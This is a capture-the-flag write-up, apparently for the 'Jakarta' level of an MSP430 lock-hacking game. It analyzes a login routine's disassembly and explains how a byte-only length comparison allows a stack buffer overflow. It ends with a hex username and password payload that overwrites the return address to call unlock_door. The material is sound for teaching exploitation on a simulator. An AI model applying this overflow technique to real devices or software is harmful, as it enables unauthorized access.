# Jakarta

I started this problem by analyzing the assembly for the `<login>` method.

```asm
4562:  3150 deff      add	#0xffde, sp
```

Adding `0xffde` to `sp` results in subtracting `0xffff - 0xffde + 1 = 0x22 (34)` to the stack pointer.

**Process Username:**

```asm
457e:  3e40 ff00      mov	#0xff, r14
4582:  3f40 0224      mov	#0x2402, r15
4586:  b012 b846      call	#0x46b8 <getsn>
```

Username is written to `0x2402`, and length of username can be up to `0xff (255)`.

```asm
458a:  3f40 0224      mov	#0x2402, r15
458e:  b012 c846      call	#0x46c8 <puts>
4592:  3f40 0124      mov	#0x2401, r15
4596:  1f53           inc	r15
4598:  cf93 0000      tst.b	0x0(r15)
459c:  fc23           jnz	$-0x6 <login+0x36>
459e:  0b4f           mov	r15, r11
45a0:  3b80 0224      sub	#0x2402, r11
```

Calculates length of user input by looking for `0x00` at the end of the input and subtracting start address from end address.

```asm
45a4:  3e40 0224      mov	#0x2402, r14
45a8:  0f41           mov	sp, r15
45aa:  b012 f446      call	#0x46f4 <strcpy>
```

Copies the user input onto the stack.

```asm
45ae:  7b90 2100      cmp.b	#0x21, r11
45b2:  0628           jnc	$+0xe <login+0x60>
45b4:  1f42 0024      mov	&0x2400, r15
45b8:  b012 c846      call	#0x46c8 <puts>
45bc:  3040 4244      br	#0x4442 <__stop_progExec__>
```

Compares username length with `0x21 (33)`, and jumps if the carry bit is not set - i.e. if the username length is less than 33. If it is greater than or equal to 33, the carry bit is set and `__stop_progExec__` is called.

**Process Password:**

```asm
45c0:  3f40 1645      mov	#0x4516 "Please enter your password:", r15
45c4:  b012 c846      call	#0x46c8 <puts>
45c8:  3e40 1f00      mov	#0x1f, r14
45cc:  0e8b           sub	r11, r14
45ce:  3ef0 ff01      and	#0x1ff, r14
45d2:  3f40 0224      mov	#0x2402, r15
45d6:  b012 b846      call	#0x46b8 <getsn>
```

Performs some calculation to determine the allowed length for the password based on the length of the username. `r11` stores the length of the username, so `sub	r11, r14` does `(0x1f - (username length))`. If username length is less than `0x1f (31)`, then the result is a positive integer. If the username length is 31, the password has length 0. But if the username has length 32 (and we saw above that the username has to be less than 33), then we have `r14 = (0x1f - 0x20) = 0xffff`.  
The next instruction simply ANDs the result with `0x1ff`.  
Therefore we have a vulnerability we can exploit here - by setting the username to a 32 byte string in length we can input a password of length up to `0x1ff (511)` bytes.

However, after entering the password, there is similar code as what we had for the username which checks the length of the password is less than 33 bytes:

```asm
45ee:  3f40 0124      mov	#0x2401, r15
45f2:  1f53           inc	r15
45f4:  cf93 0000      tst.b	0x0(r15)
45f8:  fc23           jnz	$-0x6 <login+0x92>
45fa:  3f80 0224      sub	#0x2402, r15
45fe:  0f5b           add	r11, r15
4600:  7f90 2100      cmp.b	#0x21, r15
4604:  0628           jnc	$+0xe <login+0xb2>
4606:  1f42 0024      mov	&0x2400, r15
460a:  b012 c846      call	#0x46c8 <puts>
460e:  3040 4244      br	#0x4442 <__stop_progExec__>
```

This shouldn't be a problem because if we look at the stack where the username and passwords are being copied into (in this example I set the username to 32 'x'):

```sh
> r sp 48
3ff2 7878 7878 7878 7878 7878 7878 7878 7878  xxxxxxxxxxxxxxxx
4002 7878 7878 7878 7878 7878 7878 7878 7878  xxxxxxxxxxxxxxxx
4012 0000 0000 4044 0000 0000 0000 0000 0000  ....@D..........
```

... we should be able to overwrite the address for the `ret` instruction with a password of length 6 bytes.

Testing this I input the following:

- Username: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` (x32 'x'), as a string
- Password: `0xaabbccdd4c44` in HEX
  - The last two bytes are `4c44` because that's the little endian address for the `<unlock_door>` routine (@ memory address `444c`)

Doing so we see that the stack goes:

```sh
#from this
> r 3ff2 48
3ff2 0000 0000 0000 0000 0000 0000 0000 0000  ................
4002 0000 0000 0000 0000 0000 0000 0000 0000  ................
4012 0000 0000 4044 0000 0000 0000 0000 0000  ....@D..........

#to this
> r sp 48
3ff2 7878 7878 7878 7878 7878 7878 7878 7878  xxxxxxxxxxxxxxxx
4002 7878 7878 7878 7878 7878 7878 7878 7878  xxxxxxxxxxxxxxxx
4012 aabb ccdd 4c44 0000 0000 0000 0000 0000  ....LD..........
```

> Note: the important part here is that we overwrote the return address at memory location `4016` from `4440` to `444c`.

But, when we go forward with this approach we run into a problem...

```asm
45fe:  0f5b           add	r11, r15
4600:  7f90 2100      cmp.b	#0x21, r15
4604:  0628           jnc	$+0xe <login+0xb2>
4606:  1f42 0024      mov	&0x2400, r15
460a:  b012 c846      call	#0x46c8 <puts>
460e:  3040 4244      br	#0x4442 <__stop_progExec__>
```

After calculating the length of the password (in my example the program returns 0x6), then this is added to the length of the username (0x20), which causes the Carry Bit to get set (0x21 - 0x26), so the jump is not taken and we call `<__stop_progExec__>`.

At this point the only way we will manage to take the jump branch is if `4600:  7f90 2100      cmp.b	#0x21, r15` does not set the carry bit, meaning that `r15` (i.e. the sum of username and password lengths) has to be less than 33...  
... that is unless we realize that `cmb.b` is really only comparing the LSB of `r15`... (this took me a long time to realize).

So if we enter a really long password, in theory we should be able to make the sum of username and password be something that satisfies the condition `(LSB(r15) < 33)`.

Since we can input up to `0x1ff` characters for the password this should be possible.  
I'm going to aim for a value of `r15` equal to `0x111`, which means:

length of password = `0x111 - 0x20 = 0xf1 (241)`

- Username: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` (x32 'x') - input as a string
- Password: `aaaaaaaa4c44aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` in HEX
  - Note we still need the address for the `<unlock_door>` routing in the 6th and 7th bytes.

**Solution (in HEX):**  

- **Username: `7878787878787878787878787878787878787878787878787878787878787878`.**
- **Password: `aaaaaaaa4c44aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`**

```sh
> solve
7878787878787878787878787878787878787878787878787878787878787878
aaaaaaaa4c44aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
